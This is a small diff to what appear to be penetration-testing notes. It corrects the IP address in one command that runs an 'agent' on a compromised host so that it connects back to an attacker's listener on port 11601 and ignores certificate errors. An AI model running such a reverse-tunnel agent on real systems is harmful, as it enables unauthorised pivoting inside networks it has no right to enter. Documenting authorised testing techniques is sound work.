@@ -107,6 +107,6 @@ Attacker
 
 Compromised Asset
 ```
-./agent -connect 10.5.88.33:11601 -ignore-cert
+./agent -connect 10.50.88.33:11601 -ignore-cert
 ```
 
